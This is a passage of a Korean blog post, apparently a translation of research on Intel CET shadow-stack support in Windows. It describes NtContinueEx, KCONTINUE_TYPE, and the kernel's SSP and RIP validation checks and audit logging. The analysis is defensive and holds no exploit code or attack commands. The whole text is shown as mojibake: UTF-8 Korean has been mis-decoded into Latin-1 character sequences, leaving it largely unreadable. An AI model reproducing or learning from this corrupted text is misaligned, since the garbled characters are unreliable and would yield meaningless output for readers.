ìˆìœ¼ë ¤ë©´ ì¸í„°í˜ì´ìŠ¤ì— ë” ì„¸ë°€í•œ ì œì–´ê°€ ì¶”ê°€ë˜ì–´ì•¼ í–ˆë‹¤. ì´ ì‘ì—…ì€ <code>KCONTINUE_TYPE</code>ì´ë¼ëŠ” ìƒˆ enumerationì˜ ìƒì„±ì„ í†µí•´ ìˆ˜í–‰ë˜ì—ˆìœ¼ë©°, <code>KCONTINUE_ARGUMENT</code> ë°ì´í„° êµ¬ì¡°ì— í˜„ì¬ <code>NtContinue</code>ì—ì„œ <code>NtContinueEx</code>ë¡œ í–¥ìƒëœ ë²„ì „ìœ¼ë¡œ ì „ë‹¬ë˜ì–´ì•¼ í•œë‹¤.</p><p>ì´ ë°ì´í„° êµ¬ì¡°ì—ëŠ”  <code>ContinueFlags</code> í•„ë“œê°€ ì¶”ê°€ë˜ì—ˆë‹¤. ì´ í•„ë“œëŠ”  <code>NtContinue</code>ì˜ ì›ë˜ <code>TestAlert</code> ì¸ìˆ˜ë¥¼ <code>CONTINUE_FLAG_RAISE_ALERT (0x1)</code> í”Œë˜ê·¸ë¡œ ëŒ€ì²´í•˜ëŠ” ë™ì‹œì— ìƒˆë¡œìš´ TrapFrameìœ¼ë¡œ APCë¥¼ ì§ì ‘ ì „ë‹¬í•˜ëŠ”<code>CONTINUE_FLAG_BYPASS_CONTEXT_COPY (0x2)</code> í”Œë˜ê·¸ë„ ë„ì…ë˜ì—ˆë‹¤. ì´ê²ƒì€ CONTEXT ë ˆì½”ë“œ í¬ì¸í„°ê°€ ì‚¬ìš©ì ìŠ¤íƒì˜ íŠ¹ì • ìœ„ì¹˜ì— ìˆëŠ”ì§€ í™•ì¸í•˜ì—¬ ì´ì „ì— êµ¬í˜„ëœ ìµœì í™”ë¡œ, í•¨ìˆ˜ê°€ ì‚¬ìš©ì ëª¨ë“œ APC ì „ë‹¬ì˜ ì¼ë¶€ë¡œ ì‚¬ìš©ë˜ê³  ìˆë‹¤ê³  ê°€ì •í•  ìˆ˜ ìˆë‹¤.  ì´ ë™ì‘ì„ ì›í•˜ëŠ” í˜¸ì¶œìëŠ” <code>ContinueFlags</code>ì—ì„œ í”Œë˜ê·¸ë¥¼ ëª…ì‹œì ìœ¼ë¡œ ì„¤ì •í•´ì•¼ í•œë‹¤.</p><p>ì´ì „ ì¸í„°í˜ì´ìŠ¤ëŠ” ë ˆê±°ì‹œë¡œ ê³„ì† ì§€ì›ë˜ì§€ë§Œ ë‚´ë¶€ì ìœ¼ë¡œëŠ” ì…ë ¥ ë§¤ê°œ ë³€ìˆ˜ë¥¼ <code>KCONTINUE_ARGUMENT</code>ê°€ ì•„ë‹Œ <code>BOOLEAN TestAlert</code> ë§¤ê°œ ë³€ìˆ˜ë¡œ ì¸ì‹í•˜ëŠ” <code>NtContinueEx</code>ë¥¼ í˜¸ì¶œí•œë‹¤. ì´ëŸ¬í•œ ê²½ìš°ëŠ” ìƒˆ ì¸í„°í˜ì´ìŠ¤ì—ì„œ <code>KCONTINUE_UNWIND</code>ë¡œ ì²˜ë¦¬ëœë‹¤.</p><p>ìœ„ ë¦¬íŒ©í„°ë§ì˜ ì¼ë¶€ë¡œ ë‹¤ìŒ ë„¤ ê°€ì§€ ê°€ëŠ¥í•œ ìœ í˜•ì´ ìˆë‹¤.</p><ul><li><code>KCONTINUE_UNWIND</code> â€“ ì˜ˆì™¸ì—ì„œ í•´ì œí•  ë•Œ ì‚¬ìš©ë˜ëŠ” <code>RtlRestoreContext</code> ë° <code>LdrInitializeThunk</code>ì™€ ê°™ì€ <code>NtContinue</code>ì˜ ë ˆê±°ì‹œ í˜¸ì¶œìê°€ ì‚¬ìš©</li><li><code>KCONTINUE_RESUME</code> â€“ <code>NtContinueEx</code>ë¥¼ ë‹¤ì‹œ í˜¸ì¶œí•˜ê¸° ì „ì— <code>KiUserApcDispatcher</code>ê°€ ì‹¤í–‰í•  ìœ ì € ëª¨ë“œ ìŠ¤íƒì— <code>KCONTINUE_ARGUMENT</code> êµ¬ì¡°ë¥¼ ë¹Œë“œí•  ë•Œ <code>KiInitializeUserApc</code>ê°€ ì‚¬ìš©</li><li><code>KCONTINUE_LONGJUMP</code> â€“ ì˜ˆì™¸ ë ˆì½”ë“œì˜ ì˜ˆì™¸ ì½”ë“œê°€ <code>STATUS_LONGJUMP</code> ì¸ ê²½ìš° <code>RtlRestoreContext</code>ì—ì„œ í˜¸ì¶œí•˜ëŠ” <code>RtlContinueLongJump</code>ì—ì„œ ì‚¬ìš©ë¨</li><li><code>KCONTINUE_SET</code> â€“ <code>NtContinueEx</code>ì— ì§ì ‘ ì „ë‹¬ë˜ì§€ ì•Šê³  <code>NtSetContextThread</code> APIì— ëŒ€í•œ ì‘ë‹µìœ¼ë¡œ <code>PspGetSetContextInternal</code> ë‚´ì—ì„œ <a href="https://github.com/yardenshafir/cet-research/blob/master/src/KeVerifyContextIpForUserCet.c">KeVerifyContextIpForUserCet</a>ì„ í˜¸ì¶œí•  ë•Œ ì‚¬ìš©ë¨</li></ul><h2 id="SSP-Shadow-Stack-Pointer-ìœ íš¨ì„±-ê²€ì‚¬"><a href="#SSP-Shadow-Stack-Pointer-ìœ íš¨ì„±-ê²€ì‚¬" class="headerlink" title="SSP(Shadow Stack Pointer) ìœ íš¨ì„± ê²€ì‚¬"></a>SSP(Shadow Stack Pointer) ìœ íš¨ì„± ê²€ì‚¬</h2><p>ì•ì„œ ì–¸ê¸‰í–ˆë“¯ì´ ì˜ˆì™¸ í•´ì œ, APC, longjmp ë“±ê³¼ ê°™ì´ ìœ ì € ëª¨ë“œ ì½”ë“œê°€ SSPë¥¼ ë³€ê²½í•´ì•¼ í•˜ëŠ” ê²½ìš°ê°€ ìˆë‹¤. ê·¸ëŸ¬ë‚˜ ìš´ì˜ ì²´ì œëŠ” CET ìš°íšŒ ë°©ì§€ë¥¼ ìœ„í•´ SSPì— ìš”ì²­ëœ ìƒˆ ê°’ì„ ê²€ì¦í•´ì•¼ í•œë‹¤. ì´ëŠ” <code>19H1</code>ì—ì„œ ìƒˆë¡œìš´ <a href="https://github.com/yardenshafir/cet-research/blob/master/src/KeVerifyContextXStateCetU.c">KeVerifyContextXStateCetU</a> í•¨ìˆ˜ì— ì˜í•´ êµ¬í˜„ë˜ì—ˆë‹¤. ì´ í•¨ìˆ˜ëŠ” ì½˜í…ìŠ¤íŠ¸ê°€ ìˆ˜ì •ë˜ëŠ” ìŠ¤ë ˆë“œì™€ ìŠ¤ë ˆë“œì˜ ìƒˆ ì½˜í…ìŠ¤íŠ¸ë¥¼ ìˆ˜ì‹ í•˜ê³  ë‹¤ìŒì„ ìˆ˜í–‰í•œë‹¤.</p><ul><li>CONTEXT_EXì— XState ë°ì´í„°ê°€ í¬í•¨ë˜ì–´ ìˆì§€ ì•Šê±°ë‚˜ XState ë°ì´í„°ì— CET ë ˆì§€ìŠ¤í„°ê°€ í¬í•¨ë˜ì§€ ì•Šì€ ê²½ìš° (<code>XSTATE_CET_U</code> ìƒíƒœ ë¹„íŠ¸ë¡œ <code>RtlLocateExtendedFeature2</code>ë¥¼ í˜¸ì¶œí•˜ì—¬ í™•ì¸) ìœ íš¨ì„± ê²€ì‚¬ê°€ í•„ìš”í•˜ì§€ ì•Šë‹¤.</li><li>ëŒ€ìƒ ìŠ¤ë ˆë“œì—ì„œ CETê°€ í™œì„±í™”ëœ ê²½ìš° :<ul><li>í˜¸ì¶œìê°€ <code>XSAVEBV</code>ì—ì„œ <code>XSTATE_MASK_CET_U</code>ë¥¼ ë§ˆìŠ¤í‚¹í•˜ì—¬ ì´ ìŠ¤ë ˆë“œì—ì„œ CETë¥¼ ë¹„í™œì„±í™”í•˜ëŠ”ì§€ í™•ì¸í•œë‹¤. ì´ ê²½ìš° í•¨ìˆ˜ëŠ” ìƒíƒœ ë¹„íŠ¸ë¥¼ ë‹¤ì‹œ í™œì„±í™”í•˜ê³  <code>MSR_IA32_CET_SHSTK_EN</code> (CETì˜ ì„€ë„ìš° ìŠ¤íƒ ê¸°ëŠ¥ì„ í™œì„±í™”í•˜ëŠ” í”Œë˜ê·¸)ì„ <code>Ia32CetUMsr</code>ì— ì„¤ì •í•˜ê³  í˜„ì¬ ì„€ë„ìš° ìŠ¤íƒì„ <code>Ia32Pl3SspMsr</code>ë¡œ ì„¤ì •í•œë‹¤.</li><li>ë°˜ë©´ì— <a href="https://github.com/yardenshafir/cet-research/blob/master/src/KiVerifyContextXStateCetUEnabled.c">KiVerifyContextXStateCetUEnabled</a>ë¥¼ í˜¸ì¶œí•˜ë©´ CET ì„€ë„ìš° ìŠ¤íƒì´ í™œì„±í™”ë˜ì—ˆëŠ”ì§€, (<code>MSR_IA32_CET_SHSTK_EN</code> í™œì„±í™” ì—¬ë¶€) ìƒˆ SSPê°€ 8byteë¡œ ì •ë ¬ë˜ì—ˆëŠ”ì§€, í˜„ì¬ SSP ê°’ê³¼ ì„€ë„ìš° ìŠ¤íƒ ì˜ì—­ì˜ VAD ë ì‚¬ì´ì— ìˆëŠ”ì§€ í™•ì¸í•œë‹¤. ìŠ¤íƒì´ ê±°ê¾¸ë¡œ ì„±ì¥í•˜ê¸° ë•Œë¬¸ì— ì˜ì—­ì˜ â€œëâ€ì´ ì‹¤ì œë¡œ ìŠ¤íƒì˜ ì‹œì‘ ì£¼ì†Œì´ë‹¤. ë”°ë¼ì„œ ìŠ¤ë ˆë“œì— ëŒ€í•œ ìƒˆ ì½˜í…ìŠ¤íŠ¸ë¥¼ ì„¤ì •í•  ë•Œ ëª¨ë“  SSP ê°’ì€ ìŠ¤ë ˆë“œì—ì„œ ì§€ê¸ˆê¹Œì§€ ì‚¬ìš©ëœ ì„€ë„ìš° ìŠ¤íƒ ë‚´ì— ìˆëŠ” í•œ ìœ íš¨í•˜ë‹¤. ë˜í•œ ìŠ¤ë ˆë“œê°€ ì„€ë„ìš° ìŠ¤íƒ ë‚´ë¶€ë¡œ ì´ë™í•  ìˆ˜ ìˆëŠ” ë²”ìœ„ì—ëŠ” ì œí•œì´ ì—†ë‹¤.</li></ul></li><li>CETê°€ ëŒ€ìƒ ìŠ¤ë ˆë“œì—ì„œ ë¹„í™œì„±í™”ë˜ê³  í˜¸ì¶œìê°€ CONTEXT_EXì˜ <code>XSAVEBV</code>ì— <code>XSTATE_CET_U</code> ë§ˆìŠ¤í¬ë¥¼ í¬í•¨í•˜ì—¬ í™œì„±í™”ë¥¼ ì‹œë„í•˜ëŠ” ê²½ìš° ë‘ MSR ê°’ì´ ëª¨ë‘ 0ìœ¼ë¡œ ì„¤ì •ë˜ë„ë¡ í—ˆìš©í•œë‹¤. (ì„€ë„ìš° ìŠ¤íƒ X, SSP X)</li></ul><p>ìœ„ ìœ íš¨ì„± ê²€ì‚¬ì— ì‹¤íŒ¨í•˜ë©´ <code>STATUS_SET_CONTEXT_DENIED</code>ê°€ ë°˜í™˜ë˜ê³  ì„±ê³µí•˜ë©´ <code>STATUS_SUCCESS</code>ê°€ ë°˜í™˜ëœë‹¤.</p><p>CETë¥¼ í™œì„±í™”í•˜ë©´ ê¸°ì¡´ Windows 8.1ì—ì„œ CFGì™€ í•¨ê»˜ êµ¬í˜„ëœ Check Stack Extentsë„ ì•”ì‹œì ìœ¼ë¡œ í™œì„±í™”ëœë‹¤. ì´ê²ƒì€ KPROCESSì˜ <code>ProcessFlags</code> í•„ë“œì— ìˆëŠ” <code>CheckStackExtents</code> ë¹„íŠ¸ë¥¼ í†µí•´ í™•ì¸í•  ìˆ˜ ìˆë‹¤. ì¦‰, ëŒ€ìƒ SSPê°€ ìœ íš¨ì„±ì„ ê²€ì‚¬í•  ë•Œë§ˆë‹¤ <a href="https://github.com/yardenshafir/cet-research/blob/master/src/KeVerifyContextRecord.c">KeVerifyContextRecord</a> ë˜í•œ í˜¸ì¶œë˜ê³  ëŒ€ìƒ RSPê°€ í˜„ì¬ ìŠ¤ë ˆë“œì˜ TEB ì‚¬ìš©ì ìŠ¤íƒ ì œí•œ (ë˜ëŠ” ì´ê²ƒì´ WOW64 í”„ë¡œì„¸ìŠ¤ì¸ ê²½ìš° TEB32ì˜ ì‚¬ìš©ì ìŠ¤íƒ ì œí•œ)ì˜ ì¼ë¶€ì¸ì§€ í™•ì¸í•œë‹¤. <code>RtlGuardIsValidStackPointer</code> (ë° <code>RtlGuardIsValidWow64StackPointer</code>)ì— ì˜í•´ êµ¬í˜„ëœ ì´ëŸ¬í•œ ê²€ì‚¬ëŠ” ì´ì „ì— <a href="https://medium.com/tenable-techblog/api-series-setthreadcontext-d08c9f84458d">Tenable</a> ë° <a href="https://blog.ensilo.com/atombombing-cfg-protected-processes">enSilo</a>ì˜ ì—°êµ¬ì›ì— ì˜í•´ ë¬¸ì„œí™”ë˜ì—ˆë‹¤.</p><h2 id="RIP-Instruction-Pointer-ìœ íš¨ì„±-ê²€ì‚¬"><a href="#RIP-Instruction-Pointer-ìœ íš¨ì„±-ê²€ì‚¬" class="headerlink" title="RIP(Instruction Pointer) ìœ íš¨ì„± ê²€ì‚¬"></a>RIP(Instruction Pointer) ìœ íš¨ì„± ê²€ì‚¬</h2><p><code>19030</code> ë¹Œë“œ ë²„ì „ì— Intel CETë¥¼ ì‚¬ìš©í•˜ëŠ” ë˜ ë‹¤ë¥¸ ê¸°ëŠ¥ì¸ í˜¸ì¶œìê°€ í”„ë¡œì„¸ìŠ¤ì— ëŒ€í•´ ì„¤ì •í•˜ë ¤ëŠ” ìƒˆ RIPê°€ ìœ íš¨í•œì§€ í™•ì¸í•˜ëŠ” ê¸°ëŠ¥ì´ ì¶”ê°€ë˜ì—ˆë‹¤. SSP ìœ íš¨ì„± ê²€ì‚¬ì™€ ë§ˆì°¬ê°€ì§€ë¡œ ì´ëŠ” ìŠ¤ë ˆë“œì— ëŒ€í•´ CETì´ í™œì„±í™”ëœ ê²½ìš°ì—ë§Œ ì ìš©ëœë‹¤. ê·¸ëŸ¬ë‚˜ RIP ìœ íš¨ì„± ê²€ì‚¬ëŠ” ê¸°ë³¸ì ìœ¼ë¡œ í™œì„±í™”ë˜ì–´ ìˆì§€ ì•Šìœ¼ë©° í”„ë¡œì„¸ìŠ¤ì— ëŒ€í•´ í™œì„±í™”ë˜ì–´ì•¼ í•œë‹¤. (EPROCESSì˜ <code>MitigationFlags2Values</code> í•„ë“œì— ìˆëŠ” <code>UserCetSetContextIpValidation</code> ë¹„íŠ¸ë¡œ í‘œì‹œë¨).</p><p>ì¦‰, í˜„ì¬ ë¹Œë“œì˜ ê²½ìš° <code>CreateProcess</code>ë¥¼ í˜¸ì¶œí•˜ê³  <code>PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY</code> ì†ì„±ì„ ì‚¬ìš©í•  ë•Œ <code>PROCESS_CREATION_MITIGATION_POLICY2_CET_USER_SHADOW_STACKS_ALWAYS_ON</code> í”Œë˜ê·¸ê°€ í™œì„±í™”ë˜ë©´ ì˜µì…˜ì´ ì„¤ì •ë˜ëŠ” ê²ƒìœ¼ë¡œ ë³´ì¸ë‹¤. (CETëŠ” í”„ë¡œì„¸ìŠ¤ ìƒì„± ì‹œì—ë§Œ í™œì„±í™”ë  ìˆ˜ ìˆìœ¼ë¯€ë¡œ <code>ProcessUserShadowStackPolicy</code> ê°’ìœ¼ë¡œ <code>SetProcessMitgationPolicy</code> APIë¥¼ í˜¸ì¶œí•˜ëŠ” ê²ƒì€ ìœ íš¨í•˜ì§€ ì•Šë‹¤.)</p><p>ê·¸ëŸ¬ë‚˜ í¥ë¯¸ë¡­ê²Œë„ ìƒˆë¡œìš´ mitigation ì˜µì…˜ì¸ <code>PS_MITIGATION_OPTION_USER_CET_SET_CONTEXT_IP_VALIDATION (32)</code> ì´ mitigation mapì— ì¶”ê°€ë˜ì—ˆë‹¤. ë¬¸ì„œí™”ë˜ì§€ ì•Šì€ ì´ mitigationì„ í† ê¸€ í•˜ë©´ <code>MitigationFlags2Values</code> í•„ë“œì—ì„œ <code>AuditUserCetSetContextIpValidation</code> ë¹„íŠ¸ë¥¼ í™œì„±í™”í•œë‹¤. ë˜í•œ ì´ê²ƒì€ ì´ì œ 32 ë²ˆì§¸ mitigation ì˜µì…˜ (ê°ê° DEFERRED / OFF / ON / RESERVEDì— ëŒ€í•´ 4 ë¹„íŠ¸ë¥¼ ì°¨ì§€í•¨)ì´ë¯€ë¡œ 132ê°œì˜ mitigation ë¹„íŠ¸ê°€ í•„ìš”í•˜ë©° <code>PS_MITIGATION_OPTIONS_MAP</code>ëŠ” Map í•„ë“œì˜ 3ê°œì˜ 64 ë¹„íŠ¸ ë°°ì—´ ìš”ì†Œë¡œ í™•ì¥ë˜ì—ˆë‹¤.  (<code>PS_SYSTEM_DLL_INIT_BLOCK</code>ì˜ í¬ê¸°ì— ëŒ€í•œ í›„ì† íš¨ê³¼ê°€ ìˆìŒ)</p><p>ìƒˆë¡œìš´ <a href="https://github.com/yardenshafir/cet-research/blob/master/src/KeVerifyContextIpForUserCet.c">KeVerifyContextIpForUserCet</a> í•¨ìˆ˜ëŠ” ìŠ¤ë ˆë“œì˜ ì½˜í…ìŠ¤íŠ¸ê°€ ë³€ê²½ë  ë•Œë§ˆë‹¤ í˜¸ì¶œëœë‹¤. ìŠ¤ë ˆë“œì— ëŒ€í•´ CET ë° RIP mitigationì´ ëª¨ë‘ í™œì„±í™”ë˜ì–´ ìˆëŠ”ì§€ í™•ì¸í•˜ê³  ì½˜í…ìŠ¤íŠ¸ ë§¤ê°œ ë³€ìˆ˜ì— <code>CONTEXT_CONTROL</code> í”Œë˜ê·¸ê°€ ì„¤ì •ë˜ì–´ ìˆëŠ”ì§€ í™•ì¸í•œë‹¤. ì¦‰, ì´ ìƒˆ ì½˜í…ìŠ¤íŠ¸ì— ì˜í•´ RIPê°€ ë³€ê²½ë¨ì„ ì˜ë¯¸í•œë‹¤. ëª¨ë“  ê²€ì‚¬ê°€ í†µê³¼ë˜ë©´ ë‚´ë¶€ <a href="https://github.com/yardenshafir/cet-research/blob/master/src/KiVerifyContextIpForUserCet.c">KiVerifyContextIpForUserCet</a> í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•œë‹¤. ì´ í•¨ìˆ˜ì˜ ëª©ì ì€ ëŒ€ìƒ RIPê°€ ìœ íš¨í•œ ê°’ì´ê³  ìµìŠ¤í”Œë¡œì‡ì´ ì„ì˜ ì½”ë“œë¥¼ ì‹¤í–‰í•˜ëŠ” ë° ì‚¬ìš©í•˜ëŠ” ê°’ì´ ì•„ë‹Œì§€ í™•ì¸í•˜ëŠ” ê²ƒì´ë‹¤.</p><p>ë¨¼ì € ëŒ€ìƒ RIP ì£¼ì†Œê°€ ì»¤ë„ ì£¼ì†Œê°€ ì•„ë‹ˆë©° ë§¤í•‘ë˜ì–´ì„œëŠ” ì•ˆ ë˜ëŠ” í•˜ìœ„ 0x10000 ë°”ì´íŠ¸ì˜ ì£¼ì†Œê°€ ì•„ë‹Œì§€ í™•ì¸í•œë‹¤. ê·¸ëŸ° ë‹¤ìŒ ëŒ€ìƒ RIPê°€ ìœ ì € ëª¨ë“œì˜ ì´ì „ ì£¼ì†Œì¸ ê²½ìš°ë¥¼ í—ˆìš©í•˜ê¸° ìœ„í•´ì„œ í•´ë‹¹ ê¸°ë³¸ íŠ¸ë© í”„ë ˆì„ì„ ê²€ìƒ‰í•˜ê³  ëŒ€ìƒ RIPê°€ í•´ë‹¹ íŠ¸ë© í”„ë ˆì„ì˜ RIPì¸ì§€ í™•ì¸í•œë‹¤. ì¼ë°˜ì ìœ¼ë¡œ ìŠ¤ë ˆë“œì— ëŒ€í•´ <code>NtSetThreadContext</code>ê°€ ì²˜ìŒ í˜¸ì¶œë˜ê³  RIPê°€ ìŠ¤ë ˆë“œì˜ ì´ˆê¸° ì‹œì‘ ì£¼ì†Œë¡œ ì„¤ì •ë  ë•Œ ë°œìƒí•˜ì§€ë§Œ ì¼ë°˜ì ì´ì§€ ì•Šì€ ë‹¤ë¥¸ ê²½ìš°ì—ë„ ë°œìƒí•  ìˆ˜ ìˆë‹¤.</p><p>ì´ í•¨ìˆ˜ëŠ” <code>KCONTINUE_TYPE</code>ì„ ìˆ˜ì‹ í•˜ê³  í•´ë‹¹ ê°’ì— ë”°ë¼ ë‹¤ì–‘í•œ ë°©ì‹ìœ¼ë¡œ ëŒ€ìƒ RIPë¥¼ ì²˜ë¦¬í•œë‹¤. ëŒ€ë¶€ë¶„ì˜ ê²½ìš° ì„€ë„ìš° ìŠ¤íƒì„ ë°˜ë³µí•˜ê³  ëŒ€ìƒ RIPë¥¼ ê²€ìƒ‰í•˜ëŠ”ë°, ì°¾ì§€ ëª»í•˜ë©´ ì˜ˆì™¸ê°€ ë°œìƒí•˜ë©° ì˜ˆì™¸ í•¸ë“¤ëŸ¬ì— ë„ë‹¬í•  ë•Œê¹Œì§€ ê³„ì† ì‹¤í–‰ëœë‹¤. ì˜ˆì™¸ í•¸ë“¤ëŸ¬ëŠ” ì œê³µëœ <code>KCONTINUE_TYPE</code>ì´ <code>KCONTINUE_UNWIND</code>ì¸ì§€ í™•ì¸í•˜ê³  <code>KCONTINUE_UNWIND</code> í”Œë˜ê·¸ì™€ í•¨ê»˜ <a href="https://github.com/yardenshafir/cet-research/blob/master/src/RtlVerifyUserUnwindTarget.c">RtlVerifyUserUnwindTarget</a>ì„ í˜¸ì¶œí•˜ëŠ”ì§€ í™•ì¸í•œë‹¤. ì´ ê¸°ëŠ¥ì€ ë‹¤ìŒ ì„¹ì…˜ì—ì„œ ì„¤ëª…í•˜ëŠ” ë” ë³µì¡í•œ ê²€ì‚¬ë¥¼ ì‚¬ìš©í•˜ì—¬ RIPë¥¼ ë‹¤ì‹œ í™•ì¸í•œë‹¤.</p><p>ë‹¤ë¥¸ ê²½ìš°ì—ëŠ” <code>STATUS_SET_CONTEXT_DENIED</code>ë¥¼ ë°˜í™˜í•˜ì—¬ EPROCESSì— <code>AuditUserCetSetContextIpValidation</code> í”Œë˜ê·¸ê°€ ì„¤ì •ëœ ê²½ìš° ì‹¤íŒ¨ ê²€ì‚¬ë¥¼ ìœ„í•´ <a href="https://github.com/yardenshafir/cet-research/blob/master/src/KeVerifyContextIpForUserCet.c">KeVerifyContextIpForUserCet</a>ì´ <code>KiLogUserCetSetContextIpValidationAudit</code>í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•œë‹¤. ì´ ê²€ì‚¬(auditing)ëŠ” ì¼ë°˜ì ì¸ í”„ë¡œì„¸ìŠ¤ mitigation ETW ì±„ë„ì„ í†µí•´ ìˆ˜í–‰ë˜ëŠ” ëŒ€ì‹  WER (Windows ì˜¤ë¥˜ë³´ê³ ) ì„œë¹„ìŠ¤ë¥¼ í†µí•´ ë¹ ë¥¸ ì‹¤íŒ¨ ì˜ˆì™¸ë¥¼ ì§ì ‘ ë°œìƒì‹œí‚¤ëŠ” ë°©ì‹ìœ¼ë¡œ ìˆ˜í–‰ëœë‹¤. (<code>FAST_FAIL_SET_CONTEXT_DENIED</code>ë¡œ ì„¤ì •ëœ ì •ë³´ë¡œ <code>0xC000409</code> ì˜ˆì™¸ë¥¼ ì „ì†¡). WER ìŠ¤íŒ¸ì„ ë°©ì§€í•˜ê¸° ìœ„í•´ <code>AuditUserCetSetContextIpValidationLogged</code>ë¼ëŠ” ë˜ ë‹¤ë¥¸ EPROCESS ë¹„íŠ¸ê°€ ì‚¬ìš©ëœë‹¤.</p><p>ìŠ¤ë ˆë“œê°€ ì¢…ë£Œë˜ê³  í˜„ì¬ ì„€ë„ìš° ìŠ¤íƒ ì£¼ì†Œê°€ í˜ì´ì§€ë¡œ ì •ë ¬ëœ ê²½ìš° í•¨ìˆ˜ê°€ ëŒ€ìƒ RIPë¥¼ ì°¾ê¸° ì „ì— ì„€ë„ìš° ìŠ¤íƒì— ëŒ€í•œ ë£¨í”„ë¥¼ ì¤‘ì§€í•˜ëŠ” ê²½ìš°ê°€ ìˆë‹¤. ì¦‰, ìŠ¤ë ˆë“œë¥¼ ì¢…ë£Œí•  ë•Œ í•¨ìˆ˜ëŠ” ìµœìš°ì„ ì ìœ¼ë¡œ ì„€ë„ìš° ìŠ¤íƒì˜ í˜„ì¬ í˜ì´ì§€ì—ì„œë§Œ ëŒ€ìƒ RIPë¥¼ í™•ì¸í•œë‹¤. í•´ë‹¹ í˜ì´ì§€ì—ì„œ ëŒ€ìƒ RIPë¥¼ ì°¾ì§€ ëª»í•˜ë©´ <code>STATUS_THREAD_IS_TERMINATING</code>ì„ ë°˜í™˜í•œë‹¤.</p><p>í•¨ìˆ˜ëŠ” <code>KCONTINUE_TYPE</code> ì´ <code>KCONTINUE_LONGJUMP</code> ì¸ ê²½ìš° ëŒ€ìƒ RIPê°€ ì„€ë„ìš° ìŠ¤íƒì— ëŒ€í•´ ê²€ì¦ë˜ì§€ ì•Šì§€ë§Œ ëŒ€ì‹  <a href="https://github.com/yardenshafir/cet-research/blob/master/src/RtlVerifyUserUnwindTarget.c">RtlVerifyUserUnwindTarget</a>ì´ <code>KCONTINUE_LONGJUMP</code> í”Œë˜ê·¸ì™€ í•¨ê»˜ í˜¸ì¶œë˜ì–´ PE Image Load Configuration Directoryì˜ <code>longjmp</code> í…Œì´ë¸”ì—ì„œ RIPë¥¼ í™•ì¸í•œë‹¤. ì´ ê¸€ì˜ ë‹¤ìŒ ì„¹ì…˜ì—ì„œ ì´ í‘œì™€ ê²€ì‚¬ì— ëŒ€í•´ ì„¤ëª…í•œë‹¤.</p><p><img src="/2021/01/17/l0ch/cet-on-windows/6.png"></p><p><a href="https://github.com/yardenshafir/cet-research/blob/master/src/KeVerifyContextIpForUserCet.c">KeVerifyContextIpForUserCet</a>ì€ ë‹¤ìŒ ë‘ í•¨ìˆ˜ ì¤‘ í•˜ë‚˜ì— ì˜í•´ í˜¸ì¶œëœë‹¤.</p><ul><li><code>PspGetSetContextInternal</code> â€“ <code>NtSetContextThread API</code>ì— ëŒ€í•œ ì‘ë‹µìœ¼ë¡œ í˜¸ì¶œëœë‹¤</li><li><a href="https://github.com/yardenshafir/cet-research/blob/master/src/KiVerifyContextRecord.c">KiVerifyContextRecord</a> â€“ <code>NtContinueEx</code>, <code>NtRaiseException</code> ë° ì¼ë¶€ ê²½ìš° <code>NtSetContextThread</code> APIì— ëŒ€í•œ ì‘ë‹µìœ¼ë¡œ í˜¸ì¶œëœë‹¤. <a href="%3Chttps://github.com/yardenshafir/cet-research/blob/master/src/KeVerifyContextIpForUserCet.c">KeVerifyContextIpForUserCet</a>ì„ í˜¸ì¶œí•˜ê¸° ì „ì— (ìˆ˜ì‹ ëœ <code>ContinueArgument</code>ê°€ NULLì´ ì•„ë‹Œ ê²½ìš°ì—ë§Œ)ì´ í•¨ìˆ˜ëŠ” í˜¸ì¶œìê°€ CS ë ˆì§€ìŠ¤í„°ë¥¼ ìˆ˜ì •í•˜ë ¤ê³  í•˜ëŠ”ì§€, ìƒˆ ê°’ì´ ìœ íš¨í•œ ê°’ì¸ì§€ë¥¼ í™•ì¸í•œë‹¤. WOW64ê°€ ì•„ë‹Œ í”„ë¡œì„¸ìŠ¤ëŠ” í”¼ì½” í”„ë¡œì„¸ìŠ¤ì´ë©°, ì´ ê²½ìš° CSë¥¼ <code>KGDT64_R3_CODE</code> ë˜ëŠ” <code>KGDT64_R3_CMCODE</code>ë¡œ ì„¤ì •í•  ìˆ˜ ìˆë‹¤. ë‹¤ë¥¸ ê°’ì€ <a href="https://github.com/yardenshafir/cet-research/blob/master/src/KiVerifyContextRecord.c">KiVerifyContextRecord</a>ê°€ ìƒˆ CS ê°’ì„ <code>KGDT64_R3_CODE</code>ë¡œ ê°•ì œí•œë‹¤. <code>KiVerifyContextRecord</code>ëŠ” <code>KiContinuePreviousModeUser</code> ë˜ëŠ” <code>KeVerifyContextRecord</code>ì— ì˜í•´ í˜¸ì¶œë˜ë©° ë‘ ë²ˆì§¸ì˜ ê²½ìš°, í•¨ìˆ˜ëŠ” RSPê°€ í”„ë¡œì„¸ìŠ¤ ìŠ¤íƒ (native ë˜ëŠ” wow64) ì¤‘ í•˜ë‚˜ì— ìˆê³  64 ë¹„íŠ¸ í”„ë¡œì„¸ìŠ¤ê°€ CSë¥¼ <code>KGDT64_R3_CODE</code>ë¡œë§Œ ì„¤ì •í•˜ëŠ”ì§€ í™•ì¸í•œë‹¤.</li></ul><p><code>KeVerifyContextIpForUserCet</code>ì„ í˜¸ì¶œí•˜ì—¬ ëŒ€ìƒ RIPì˜ ìœ íš¨ì„±ì„ ê²€ì‚¬í•˜ëŠ” ëª¨ë“  ê²½ë¡œëŠ” ë¨¼ì € <code>KeVerifyContextXStateCetU</code>ë¥¼ í˜¸ì¶œí•˜ì—¬ ëŒ€ìƒ SSPì˜ ìœ íš¨ì„±ì„ ê²€ì‚¬í•˜ê³  SSPê°€ ìœ íš¨í•  ë•Œë§Œ RIP ê²€ì‚¬ë¥¼ ìˆ˜í–‰í•œë‹¤.</p><p><img src="/2021/01/17/l0ch/cet-on-windows/7.png"></p><h1 id="ì˜ˆì™¸-í•´ì œ-ë°-longjmp-ìœ íš¨ì„±-ê²€ì‚¬"><a href="#ì˜ˆì™¸-í•´ì œ-ë°-longjmp-ìœ íš¨ì„±-ê²€ì‚¬" class="headerlink" title="ì˜ˆì™¸ í•´ì œ ë° longjmp ìœ íš¨ì„± ê²€ì‚¬"></a>ì˜ˆì™¸ í•´ì œ ë° longjmp ìœ íš¨ì„± ê²€ì‚¬</h1><p>ìœ„ì—ì„œ ì„¤ëª…í•œ ëŒ€ë¡œ <code>KCONTEXT_SET</code> ë° <code>KCONTEXT_RESUME</code>ì— ëŒ€í•œ ì²˜ë¦¬ëŠ” ëŒ€ìƒ RIPê°€ 